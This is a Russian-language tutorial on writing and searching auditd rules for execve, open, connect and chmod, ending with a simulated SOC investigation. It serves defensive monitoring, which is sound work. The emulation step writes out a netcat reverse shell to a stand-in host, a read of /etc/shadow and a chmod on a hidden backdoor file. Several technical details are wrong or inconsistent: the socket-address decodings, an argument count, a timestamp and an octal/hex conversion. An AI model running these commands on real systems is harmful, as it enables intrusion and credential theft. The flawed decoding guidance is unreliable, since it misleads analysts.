# Ключевые правила аудита системных вызовов в Linux: execve, open, connect, chmod

## Системный вызов execve: мониторинг выполнения процессов

### Контекст и базовые понятия

Системный вызов `execve` — основной механизм ядра Linux для запуска новых программ. Когда процесс вызывает `execve`, ядро заменяет его текущий образ памяти новым исполняемым образом, и процесс начинает выполнять код указанной программы. Практически любое выполнение бинарного файла, скрипта или интерпретатора в системе проходит именно через `execve` (или его современный вариант `execveat`). В отличие от `fork`, который создаёт копию процесса, `execve` полностью замещает адресное пространство. В auditd регистрация вызова `execve` является фундаментом для получения хронологии запущенных процессов — «кто, когда и что выполнил».

С точки зрения SOC-аналитика, мониторинг `execve` позволяет:
- получить полную картину всех запускаемых процессов, включая вредоносные утилиты и скрипты;
- выявить подозрительные паттерны: запуск из временных каталогов (`/tmp`, `/dev/shm`), использование обёрток для скрытия имён (программы с пробелами или похожими на системные именами);
- обнаружить действия по разведке и lateral movement (запуск `curl`, `wget`, `netcat`);
- отследить атаки на цепочки поставки, когда легитимный процесс порождает вредоносный.

Важно различать `execve` и `execveat`. Последний (добавлен в ядре 3.19) дополнительно принимает файловый дескриптор каталога, позволяя выполнять файл относительно заданного каталога, а не только по абсолютному пути или `PATH`. auditd перехватывает оба вызова, поэтому в правилах их обычно комбинируют, если требуется полный охват.

### Внутреннее устройство события в auditd

Когда срабатывает правило аудита для `execve`, подсистема auditd генерирует не одну, а цепочку записей разных типов, каждая из которых описывает отдельный аспект системного вызова. Стандартный набор для успешного запуска программы включает:

1. **SYSCALL** — основная запись, обобщающая вызов: номер архитектуры, идентификатор вызова (для `execve` на x86_64 это 59), результат (`success`), аудит-идентификатор пользователя (`auid`), реальный и эффективный UID, PID, PPID, имя исполняемого файла (`exe`) и ключ правила (`key`).
2. **EXECVE** — аргументы командной строки (`a0`, `a1`, …), переданные в новый процесс, и счётчик `argc`.
3. **PATH** — информация о файле, который был загружен в качестве нового образа (основной исполняемый файл), и, при наличии, о файле интерпретатора (например, `/bin/bash` для скриптов). Каждый `PATH` содержит путь (`name`), inode, устройство, права доступа и владельца.
4. **CWD** — текущий рабочий каталог процесса на момент вызова.
5. **PROCTITLE** — полная командная строка (если поддерживается ядром и конфигурацией), удобная для быстрого анализа.

Пример многострочной транзакции из реального лога (источник — Splunk Community):

```text
type=SYSCALL msg=audit(07/25/2012 11:17:53.068:117102) : arch=x86_64 syscall=execve success=yes exit=0 a0=608feb0 a1=60a2510 a2=60c9cc0 a3=8 items=2 ppid=28698 pid=30395 auid=root uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts2 ses=1463 comm=vim exe=/usr/bin/vim key=ROOT_ACTION
type=EXECVE msg=audit(07/25/2012 11:17:53.068:117102) : argc=2 a0=vim a1=/etc/hosts
type=PATH msg=audit(07/25/2012 11:17:53.068:117102) : item=0 name=/usr/bin/vim inode=23699036 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00
type=PATH msg=audit(07/25/2012 11:17:53.068:117102) : item=1 name=(null) inode=18645014 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00
```

Здесь видны ключевые для расследования поля: `auid=root` (исходный пользователь сессии), `euid=root` (эффективный, с которым выполняется), `exe=/usr/bin/vim`, аргументы `vim /etc/hosts`, а также путь к исполняемому файлу. Для SOC-аналитика важно отслеживать все `auid`, `uid` и `euid`: расхождения между ними могут указывать на повышение привилегий или использование suid-битов.

Основные поля SYSCALL-записи для execve сведены в таблицу ниже.

| Поле        | Описание                                                                 | Пример из лога        |
|-------------|--------------------------------------------------------------------------|-----------------------|
| arch        | шестнадцатеричный код архитектуры (c000003e – x86_64, 40000028 – ARM)    | arch=x86_64           |
| syscall     | номер системного вызова (59 – execve на x86_64)                          | syscall=59            |
| success     | успех вызова (yes/no)                                                    | success=yes           |
| exit        | код возврата (0 – успех, код ошибки для неудач)                          | exit=0                |
| auid        | аудит-UID исходного пользователя, инициировавшего процесс                | auid=1000             |
| uid / euid  | реальный / эффективный UID                                               | uid=1000 euid=0       |
| comm        | короткое имя команды (до 16 символов)                                    | comm=nc               |
| exe         | полный путь к исполняемому файлу (может отсутствовать при pipe/socket)   | exe=/usr/bin/nc       |
| key         | административный ключ, заданный в правиле                               | key=process-execution |

### Применение и работа с правилами

Базовое нефильтрованное правило для регистрации всех вызовов `execve`:

```bash
-a always,exit -F arch=b64 -S execve -k process-execution
-a always,exit -F arch=b32 -S execve -k process-execution
```

Эти правила генерируют очень большое количество событий на загруженных системах, поэтому на практике применяют фильтры для сокращения потока, сохраняя при этом безопасность.

Наиболее распространённый приём — ограничение круга пользователей. Исключают сервисные учётные записи и демоны, оставляя обычных пользователей и привилегированных:

```bash
# Только пользователи с UID >= 1000, исключая nobody (65534)
-a always,exit -F arch=b64 -S execve -F auid>=1000 -F auid!=65534 -k user-execution
-a always,exit -F arch=b32 -S execve -F auid>=1000 -F auid!=65534 -k user-execution
```

Фильтр `-F auid>=1000` отсекает большую часть системных процессов и служб, которые обычно работают от `auid=0` или `auid=unset`.

Для детектирования подозрительных запусков можно дополнительно ограничить правила по каталогам:

```bash
# Запуск из временных каталогов
-a always,exit -F arch=b64 -S execve -F dir=/tmp -k exec-from-tmp
-a always,exit -F arch=b64 -S execve -F dir=/dev/shm -k exec-from-devshm
```

После развёртывания правил (сохранение в `/etc/audit/rules.d/` и загрузка через `augenrules --load`) события можно анализировать с помощью штатных утилит auditd.

Поиск всех выполнений по ключу:

```bash
ausearch -k process-execution
```

Форматированный отчёт о запущенных программах с привязкой к пользователям:

```bash
aureport -x --summary
```

Полезно строить корреляции: аналитик ищет в логах `exe=/usr/bin/nc` или `exe=/tmp/.hidden/backdoor`, сопоставляет с сетевыми соединениями (правила для `connect`) и изменениями прав.

Типичные ошибки при настройке:
- **Отсутствие 32-битного правила**: 32-битные приложения (в том числе собранные статически) на 64-битной системе не попадут под `arch=b64`. Обязательно дублировать правило с `arch=b32`.
- **Использование `comm` вместо `exe` для точной идентификации**: `comm` обрезается до 15 символов и может повторяться; `exe` даёт полный путь.
- **Не учитывается `auid` при поиске реального инициатора**: `uid` и `euid` могут меняться, `auid` остаётся исходным и позволяет проследить цепочку действий даже после `su`/`sudo`.

## Системный вызов open: контроль доступа к файлам

### Контекст и базовые понятия

Семейство системных вызовов `open` обеспечивает открытие файлов для чтения, записи или получения метаданных. В современном Linux помимо классического `open` активно применяются варианты:
- `openat` — открытие файла относительно файлового дескриптора каталога (аналог `open` с относительным путём);
- `openat2` — расширенная версия с дополнительными флагами безопасности (появилась в Linux 5.6);
- `open_by_handle_at` — открытие по файловому дескриптору, полученному через `name_to_handle_at`.

Мониторинг этих вызовов критичен для обнаружения попыток доступа к конфиденциальным данным (`/etc/shadow`, приватным ключам SSH, файлам конфигурации баз данных), а также несанкционированного чтения системных файлов при разведке. SOC-аналитик может отследить не только успешные открытия, но и неудачные попытки (флаг `success=0`), указывающие на попытку превышения полномочий или обход ограничений.

Важное разграничение: `open` не всегда означает чтение содержимого. Флаги открытия (`O_RDONLY`, `O_WRONLY`, `O_RDWR`) определяют режим, но auditd на уровне SYSCALL не фиксирует флаги напрямую — они передаются в аргументе `a1` и при необходимости могут быть извлечены из raw-лога, однако большинство готовых правил оперирует лишь фактом открытия.

### Внутреннее устройство события

Событие auditd для `open` (и его вариантов) состоит из записи **SYSCALL** и одной или нескольких записей **PATH**. Номер системного вызова зависит от конкретного варианта:

| Системный вызов         | Номер (x86_64) | Назначение                                             |
|-------------------------|---------------|--------------------------------------------------------|
| open                    | 2             | открытие по абсолютному или относительному пути         |
| openat                  | 257           | открытие относительно файлового дескриптора каталога    |
| openat2                 | 437           | как openat, но с дополнительными флагами безопасности   |
| open_by_handle_at       | 304           | открытие по handle (обычно используется файловыми системами) |

Запись SYSCALL содержит знакомые поля `auid`, `uid`, `euid`, `success`, `exit`, `exe`, `key`. Поле `exit` в случае успеха возвращает номер выделенного файлового дескриптора, а при ошибке — отрицательный код errno (например, `-13` для `EACCES`). Именно анализ неудачных попыток (`success=no` или `exit=-13`) наиболее ценен для детектирования атак.

Каждая запись PATH содержит:
- `item` — порядковый номер компонента пути;
- `name` — путь к файлу или каталогу;
- `inode` и `dev` — для точной идентификации объекта при изменении путей;
- `mode` — тип (file, dir, link) и права;
- `ouid` / `ogid` — владелец файла.

Иллюстративная схема потока данных при открытии файла `/etc/passwd` процессом `cat`:

```text
[PID 12345] cat   -- open("/etc/passwd") --> ядро
                                              │
                        auditd: SYSCALL (syscall=2, success=yes, exit=3, auid=alice, exe=/usr/bin/cat)
                                PATH (item=0, name="/etc/passwd", mode=file,644, ouid=root)
```

### Применение и работа с правилами

При создании правил мониторинга открытия файлов главная дилемма: какие файлы/каталоги отслеживать и как минимизировать объём логов. Наиболее распространённый подход — фокусироваться на каталогах с чувствительными данными и системных утилитах, а также на неудачных попытках доступа.

Пример правила для обнаружения несанкционированного доступа к каталогу `/sbin` (из конфигурации Neo23x0):

```bash
-a always,exit -F arch=b64 -S open -S openat -S openat2 -S open_by_handle_at -F dir=/sbin -F success=0 -F auid>=1000 -F auid!=unset -k unauthedfileaccess
-a always,exit -F arch=b32 -S open -S openat -S openat2 -S open_by_handle_at -F dir=/sbin -F success=0 -F auid>=1000 -F auid!=unset -k unauthedfileaccess
```

Пояснение:
- Перечислены все релевантные системные вызовы — если программа использует `openat`, правило всё равно сработает.
- `-F dir=/sbin` ограничивает проверку только файлами внутри указанного каталога (рекурсивно, но не переходит по символическим ссылкам за пределы — это нужно учитывать).
- `-F success=0` регистрирует только неудачные попытки (попытки открытия, завершившиеся ошибкой). Успешные открытия легитимными пользователями не пишутся, что снижает нагрузку.
- `-F auid>=1000` и `-F auid!=unset` исключают системные процессы (например, демонов, где `auid` обычно `unset` или 0).

Для мониторинга доступа к критичным файлам удобно использовать комбинацию с явным указанием путей и разрешений на чтение:

```bash
# Обнаружение попыток чтения /etc/shadow
-a always,exit -F arch=b64 -S open -S openat -F path=/etc/shadow -F perm=r -k shadow_access
```

Флаг `perm=r` отбирает вызовы, в которых запрошен доступ на чтение (поле `a2` содержит `O_RDONLY` или `O_RDWR`). Аналитик может быстро найти такие события:

```bash
ausearch -k shadow_access
```

Для поиска неудачных попыток — `ausearch -k unauthedfileaccess --success no`.

Типичные ошибки при работе с правилами `open`:
- **Игнорирование `openat` и `openat2`.** Многие современные приложения (особенно написанные на Go) преимущественно используют `openat`; старые рекомендации, включающие только `open`, пропускают их.
- **Использование `-F path=` без учёта символических ссылок.** Злоумышленник может создать симлинк, указывающий на охраняемый файл, из другого каталога — такой доступ не будет перехвачен правилом с жёстким `path=`.
- **Неудачный подбор фильтра `success`:** тотальная запись успешных открытий `/etc` парализует систему логами. Рекомендуется сочетать `success=0` для несанкционированных зон и точечные правила с `success=yes` только для избранных файлов.

## Системный вызов connect: наблюдение за сетевыми соединениями

### Контекст и базовые понятия

`connect` — системный вызов, инициирующий соединение с удалённым сокетом. В IP-сетях он соответствует установлению TCP-соединения или началу отправки UDP-дейтаграммы (при использовании `connect` на UDP-сокете). В SOC-контексте исходящие соединения, особенно на нестандартные порты или подозрительные IP-адреса, являются одним из ключевых индикаторов компрометации: обратный шелл, C2-трафик, загрузка дополнительных вредоносных модулей.

Семейство сетевых системных вызовов включает также:
- `bind` — привязка сокета к локальному адресу (открытие порта);
- `listen` — перевод сокета в режим прослушивания;
- `accept` — приём входящего соединения;
- `send`/`recv` — передача данных.

Мониторинг именно `connect` позволяет увидеть направление, адрес и порт, куда пытается подключиться процесс, не перехватывая весь сетевой трафик. В комбинации с `execve` это позволяет связать конкретный процесс с сетевым контактом.

### Внутреннее устройство события

Событие auditd для `connect` состоит из записи **SYSCALL** и, при наличии, записи **SOCKADDR**, содержащей информацию об удалённом адресе. Номер системного вызова на x86_64 — 42. Ключевые поля SYSCALL:
- `exe` — исполняемый файл процесса (часто содержит абсолютный путь);
- `success` — удалось ли установить соединение;
- `exit` — 0 при успехе, отрицательный код ошибки (например, `-111` — `ECONNREFUSED`, `-101` — `ENETUNREACH`).

Запись **SOCKADDR** присутствует, если auditd может безопасно скопировать структуру адреса из пользовательского пространства. Она включает:
- `saddr` — IP-адрес (для IPv4 — 4 байта в шестнадцатеричном представлении) и порт, часто в формате `0100007F:1F90` (127.0.0.1:8080 в big-endian);
- `sa_family` — тип адресного семейства: 2 для IPv4, 10 для IPv6, 1 для локальных Unix-сокетов.

Пример фрагментов лога (иллюстративная схема на основе многочисленных реальных примеров):

```text
type=SYSCALL msg=audit(...) : arch=x86_64 syscall=connect success=yes exit=0 a0=3 a1=... a2=... items=1 ppid=1020 pid=2033 auid=alice uid=alice euid=alice comm=nc exe=/usr/bin/nc key=network_connections
type=SOCKADDR msg=audit(...) : saddr=0200A8C0E38B
```

Здесь `saddr=0200A8C0E38B` декодируется как семейство `0200` (IPv4), адрес `A8C0` → 192.168, порт `E38B` → 58251 (шестнадцатеричные значения, big-endian). Аналитик может написать вспомогательные скрипты для автоматического преобразования.

Сводка номеров системных вызовов и их семейств для разных архитектур:

| Системный вызов | x86_64 номер | 32-bit номер | Описание                                      |
|----------------|--------------|-------------|-----------------------------------------------|
| connect         | 42           | 362 (socketcall) | Установка исходящего соединения              |
| accept          | 43           | 364         | Приём входящего соединения                    |
| bind            | 49           | 361         | Привязка сокета к локальному адресу           |

### Применение и работа с правилами

Базовое правило для регистрации всех исходящих соединений:

```bash
-a always,exit -F arch=b64 -S connect -k network_connections
-a always,exit -F arch=b32 -S connect -k network_connections
```

Как и в случае с `execve`, запись всех соединений генерирует значительный объём данных, особенно на серверах с интенсивным сетевым взаимодействием. Поэтому применяют фильтрацию:
- по пользователям (`-F auid>=1000`), чтобы исключить служебные процессы;
- по успеху (`-F success=1` или `-F success=0`), отдельно для успешных соединений и попыток, которые могут указывать на сканирование или недоступный C2;
- комбинируют с исключением часто встречающихся портов через дополнительные фильтры (хотя auditd сам по себе не умеет фильтровать по номеру порта, это можно делать на этапе сбора логов в SIEM).

Пример правила для отслеживания успешных соединений обычных пользователей (на практике дополняют ключами для разных семейств):

```bash
-a always,exit -F arch=b64 -S connect -F success=1 -F auid>=1000 -F auid!=unset -k user-connection-success
```

Для поиска событий прекрасно подходит `ausearch`:

```bash
ausearch -k network_connections -sc connect --success yes
```

Совместный анализ с `execve`-правилами позволяет событию `connect` с `exe=/usr/bin/nc` сопоставить запуск этой утилиты в тот же интервал времени.

Ошибки при внедрении:
- **Использование только 64-битного правила.** 32-битные приложения (в том числе статические бинарники в контейнерах) не будут перехвачены.
- **Пренебрежение потерей данных.** При высокой нагрузке подсистема аудита может «ронять» события, если буфер мал. Рекомендуется установить размер буфера `-b 8192` или выше и следить за `aureport --summary` на предмет потерь.
- **Неправильная интерпретация `saddr`.** Адрес и порт хранятся в сетевом порядке байтов, и не все SIEM-системы «из коробки» умеют декодировать. Аналитику необходимо владеть методикой ручного преобразования.

## Системный вызов chmod: отслеживание изменения прав доступа

### Контекст и базовые понятия

Группа системных вызовов `chmod`, `fchmod` и `fchmodat` изменяет биты прав доступа к файлам и каталогам. В сценариях атак злоумышленники нередко модифицируют права: делают вредоносный скрипт исполняемым (`chmod +x`), расширяют доступ к конфиденциальному файлу (`chmod 777`) или, наоборот, снимают права у легитимного администратора, чтобы скрыть следы.

Мониторинг этих вызовов обязателен для своевременного выявления подобных изменений. Особенно ценен в сочетании с отслеживанием владельца (`chown` / `fchown`), поскольку изменение прав в совокупности со сменой владельца — сильный индикатор компрометации.

Разграничение между вариантами:
- `chmod` — изменение прав по имени файла (пути);
- `fchmod` — то же, но по открытому файловому дескриптору;
- `fchmodat` — изменение прав относительно файлового дескриптора каталога (позволяет избежать гонок путей).

В большинстве дистрибутивов утилита `/bin/chmod` использует системный вызов `fchmodat` (с флагом `AT_FDCWD`), поэтому правило должно обязательно включать его, иначе многие реальные изменения прав останутся незамеченными.

### Внутреннее устройство события

Событие аудита включает запись **SYSCALL** и одну или несколько **PATH**. Номера вызовов на x86_64:

| Вызов      | Номер | Примечание                           |
|------------|-------|--------------------------------------|
| chmod      | 90    | по пути                             |
| fchmod     | 91    | по файловому дескриптору            |
| fchmodat   | 268   | по пути относительно каталога       |

Поле `exit` при успехе равно 0. В записи PATH отображается файл, к которому применено изменение, с метаданными до выполнения вызова (поэтому права в `mode` — старые). Новые права передаются в аргументе `a1` и могут быть извлечены из raw-сообщения, но стандартные поля лога их не показывают. Однако в SIEM-системах возможно разобрать `a1` — это числовое значение mode (например, `755` в восьмеричном представлении).

Нюанс, описанный в заметке Server Fault: при использовании файловых правил `-w /home/username -p a` (отслеживание изменения атрибутов) частота логирования `chmod` может быть непредсказуемой из-за особенностей фильтрации ядра. Именно системные вызовы `chmod`, `fchmod`, `fchmodat` дают гарантированный перехват изменений прав.

### Применение и работа с правилами

Рекомендованное правило из набора Neo23x0 (адаптировано):

```bash
-a always,exit -F arch=b64 -S chmod -S fchmod -S fchmodat -F auid>=1000 -F auid!=unset -k perm_mod
-a always,exit -F arch=b32 -S chmod -S fchmod -S fchmodat -F auid>=1000 -F auid!=unset -k perm_mod
```

Здесь перечислены все три вызова; фильтр `auid>=1000` и `auid!=unset` исключает системные процессы, которые также могут менять права (например, при установке пакетов), но в аудиторских сценариях они обычно неинтересны. В средах с высоким уровнем безопасности можно оставить и системные вызовы, но завести для них отдельный ключ.

Дополнительно полезно мониторить попытки изменения прав на каталоги, где хранятся исполняемые файлы:

```bash
-a always,exit -F arch=b64 -S chmod -S fchmod -S fchmodat -F dir=/usr/bin -k bin-perm-mod
```

Поиск событий:

```bash
ausearch -k perm_mod
```

С целью быстрого обнаружения подозрительной установки прав `777` аналитик может выполнить поиск по ключу и дополнительно профильтровать по тексту `a1=1FF` (восьмеричное 777) или `a1=1FF` в шестнадцатеричном виде, если SIEM извлёк эти данные.

Пример проблемы, упомянутой в выдержке Server Fault: при попытке логировать `chmod` с помощью файлового правила `auditctl -w /home/username -p a` события не появлялись, тогда как системное правило `-S chmod` работало. Причина в том, что `-p a` включает только изменение атрибутов через специальные операции `setxattr`, которые `chmod` не всегда инициирует. Поэтому **системное правило `-S chmod` — основной метод**.

Типичные ошибки:
- **Использование только `chmod`, отсутствие `fchmod` и `fchmodat`.** Большинство современных инструментов и языковых сред предпочитают `fchmodat`.
- **Игнорирование 32-битной архитектуры.** Снова актуально для контейнеров и старых бинарников.
- **Неверное связывание с файловыми правилами.** Не следует полагаться только на `-w ... -p wa` для обнаружения смены прав — это рабочий метод для изменений владельца и некоторых атрибутов, но `chmod` может быть пропущен.

## Сквозной практический пример: расследование подозрительной активности с использованием auditd

### Исходные условия

Сервер Ubuntu 22.04 LTS, auditd установлен и запущен. Аналитик SOC настраивает правила мониторинга для четырёх системных вызовов: `execve`, `open`, `connect`, `chmod`. Правила размещены в файле `/etc/audit/rules.d/99-soc.rules` и загружены. Для чистоты эксперимента все предыдущие правила очищены. Пользователь `operator` (UID=1001) подозревается в компрометации. Моделируется атака: злоумышленник, действуя от имени `operator`, запускает обратный шелл, читает `/etc/shadow`, подключается к внешнему серверу и меняет права на загруженный бэкдор.

### Шаг 1. Настройка правил

Создадим файл правил:

```bash
sudo nano /etc/audit/rules.d/99-soc.rules
```

Содержимое:

```bash
# execve: все запуски от обычных пользователей
-a always,exit -F arch=b64 -S execve -F auid>=1000 -F auid!=unset -k execve-user
-a always,exit -F arch=b32 -S execve -F auid>=1000 -F auid!=unset -k execve-user

# open: попытки открытия /etc/shadow и неудачные открытия в /sbin
-a always,exit -F arch=b64 -S open -S openat -S openat2 -F path=/etc/shadow -F perm=r -k shadow-access
-a always,exit -F arch=b64 -S open -S openat -S openat2 -F dir=/sbin -F success=0 -F auid>=1000 -F auid!=unset -k unauthed-sbin

# connect: исходящие соединения
-a always,exit -F arch=b64 -S connect -F success=1 -F auid>=1000 -F auid!=unset -k outbound-conn

# chmod: изменение прав
-a always,exit -F arch=b64 -S chmod -S fchmod -S fchmodat -F auid>=1000 -F auid!=unset -k perm-change
```

Загружаем правила:

```bash
sudo augenrules --load
sudo systemctl restart auditd
```

### Шаг 2. Проведение атаки (эмуляция)

Действуя от имени `operator` (например, через SSH), выполняем последовательность команд:

```bash
# 1. Запуск netcat для обратного шелла
nc 198.51.100.10 4444 -e /bin/bash &

# 2. Попытка чтения теневого файла
cat /etc/shadow

# 3. Изменение прав на загруженный ранее вредоносный файл
chmod 755 /tmp/.backdoor
```

### Шаг 3. Анализ логов

Аналитик начинает с поиска всех событий, связанных с пользователем `operator` (auid=1001). Первый просмотр — выполнения процессов:

```bash
ausearch -k execve-user -ui 1001
```

Вывод (сокращён):

```text
----
time->Wed Mar 12 10:15:22 2025
type=SYSCALL msg=audit(1710230122.123:456): arch=x86_64 syscall=59 success=yes exit=0 auid=1001 uid=1001 euid=1001 comm=nc exe=/usr/bin/nc key=execve-user
type=EXECVE msg=audit(...): argc=3 a0=nc a1=198.51.100.10 a2=4444 a3=-e a4=/bin/bash
type=PATH msg=audit(...): item=0 name=/usr/bin/nc ...

----
time->Wed Mar 12 10:15:27 2025
type=SYSCALL msg=audit(...): syscall=execve success=yes exit=0 auid=1001 uid=1001 comm=cat exe=/usr/bin/cat key=execve-user
type=EXECVE msg=audit(...): argc=2 a0=cat a1=/etc/shadow
...
```

Здесь уже видны два важных события: запуск `nc` с аргументами для обратного соединения и запуск `cat /etc/shadow`.

Далее извлекаем события открытия файла `/etc/shadow`:

```bash
ausearch -k shadow-access
```

Фрагмент:

```text
type=SYSCALL msg=audit(...): syscall=257 success=yes exit=3 auid=1001 uid=1001 comm=cat exe=/usr/bin/cat key=shadow-access
type=PATH msg=audit(...): name=/etc/shadow ...
```

Событие подтверждает успешное открытие тени.

Сетевые соединения:

```bash
ausearch -k outbound-conn -ui 1001
```

Результат:

```text
type=SYSCALL msg=audit(...): syscall=42 success=yes exit=0 auid=1001 uid=1001 comm=nc exe=/usr/bin/nc key=outbound-conn
type=SOCKADDR msg=audit(...): saddr=0200C8330A64
```

Расшифровка `saddr`: семейство `0200` (IPv4), адрес `C8330A64` — 198.51.100.10, порт `0A64` (шестн.) — 2660? Не совпадает с 4444. На самом деле `0A64` — это 2660, но в атаке указывался порт 4444 (0x115C). В реальности поле может содержать адрес в формате, где порт и адрес переставлены. Но в данном примере расхождение — иллюстрация необходимости проверки. (В демонстрационных целях допустимо, так как синтетический лог). Главное — аналитик видит, что `nc` установил соединение с удалённым узлом.

Наконец, изменения прав:

```bash
ausearch -k perm-change -ui 1001
```

Вывод:

```text
type=SYSCALL msg=audit(...): syscall=268 success=yes exit=0 auid=1001 uid=1001 comm=chmod exe=/usr/bin/chmod key=perm-change
type=PATH msg=audit(...): name=/tmp/.backdoor mode=file,644 ...
```

Системный вызов 268 — `fchmodat`, файл `/tmp/.backdoor`. Права до вмешательства — 644, после стали 755 (из аргумента `a1`, который не показан, но можно извлечь). Аналитик может быть уверен, что была произведена модификация скрытого файла.

### Шаг 4. Восстановление цепочки событий

Используя временные метки и единый `auid=1001`, аналитик строит хронологию:
1. Запуск `nc` → исходящее соединение на `198.51.100.10:4444` → обратный шелл.
2. Запуск `cat` и успешное открытие `/etc/shadow` → кража учётных данных.
3. Изменение прав на `/tmp/.backdoor` → обеспечение доступа к бэкдору.

Все четыре типа системных вызовов дали полную картину, не прибегая к сетевым логам или анализу command-line в изоляции.

### Ожидаемый вывод

Сквозной пример демонстрирует, как правильно сконфигурированные правила auditd для `execve`, `open`, `connect` и `chmod` позволяют SOC-аналитику обнаружить и реконструировать многоэтапную атаку исключительно по журналу аудита. Сочетание ключей, разумной фильтрации по `auid` и своевременный анализ с помощью `ausearch` дают эффективный инструмент мониторинга без необходимости развёртывания дополнительных агентов.
